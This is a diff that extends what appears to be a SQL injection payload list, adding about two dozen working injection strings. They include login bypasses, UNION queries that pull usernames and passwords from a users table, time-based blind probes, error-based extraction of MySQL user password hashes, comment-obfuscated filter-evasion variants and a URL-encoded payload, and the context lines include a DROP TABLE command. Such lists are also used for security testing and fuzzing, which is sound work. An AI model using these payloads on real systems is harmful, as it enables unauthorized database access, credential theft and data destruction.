@@ -8,3 +8,25 @@ admin' #
 1; DROP TABLE users
 1' OR '1'='1' UNION SELECT 1,2,3--
 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' OR 'x'='x
+" OR "x"="x"
+') OR ('1'='1
+") OR ("1"="1
+admin'/*
+' OR 1=1#
+' OR 1=1/*
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT username, password FROM users--
+1' WAITFOR DELAY '0:0:5'--
+1'; pg_sleep(5)--
+1' AND SLEEP(5)--
+' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+/*!50000UNION*/ /*!50000SELECT*/ null, null--
+IF(SUBSTRING(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(5))
+1' AND UPDATEXML(1,CONCAT(0x3a,(SELECT substr(password,1,31) FROM mysql.user LIMIT 1)),1)--
+1' AND EXTRACTVALUE(2,CONCAT(0x0a,(SELECT database())))--
+%27%20UNION%20SELECT%20NULL%2CCONCAT%280x7171786271%2C%28SELECT%20%28ELT%284242%3D4242%2C1%29%29%29%2C0x71766a6a71%29--
+-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+admin' or 1=1 or ''='
+1' WAITFOR DELAY '0:0:5'--
+1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
